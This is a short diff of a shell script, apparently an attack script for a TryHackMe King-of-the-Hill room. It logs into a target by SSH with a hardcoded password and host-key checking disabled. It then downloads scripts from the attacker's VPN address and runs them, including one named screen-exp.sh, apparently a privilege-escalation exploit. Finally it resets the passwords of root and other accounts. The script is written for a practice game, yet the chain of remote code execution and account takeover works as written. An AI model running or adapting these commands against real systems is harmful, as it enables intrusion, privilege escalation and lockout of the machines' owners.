@@ -31,10 +31,10 @@ vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
 sshpass -p pastaisdynamic ssh -o StrictHostKeychecking=no pasta@"$IP" << EOF
     
-    wget http://$vpn/screen-exp.sh && chmod +x screen-exp.sh && ./screen-exp.sh
+    wget http://$vpn/bin/screen-exp.sh && chmod +x screen-exp.sh && ./screen-exp.sh
     sleep 3
 
-    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
+    cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
     echo "root:$new_password" | chpasswd
     echo "food:$new_password" | chpasswd
     echo "tryhackme:$new_password" | chpasswd
